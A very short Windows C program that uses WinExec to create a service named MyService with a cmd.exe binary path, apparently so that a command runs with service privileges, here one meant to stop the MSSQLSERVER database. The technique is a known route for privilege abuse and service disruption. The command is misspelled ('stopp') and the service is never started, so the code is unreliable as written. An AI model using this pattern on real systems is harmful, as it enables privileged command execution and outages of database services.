#include <windows.h>

#define RUN(toRun) WinExec("sc create MyService binPath= cmd.exe /c " toRun, SW_SHOW);

int main() {
    RUN("C:\\Windows\\System32\\net.exe stopp MSSQLSERVER");
    return 0;
}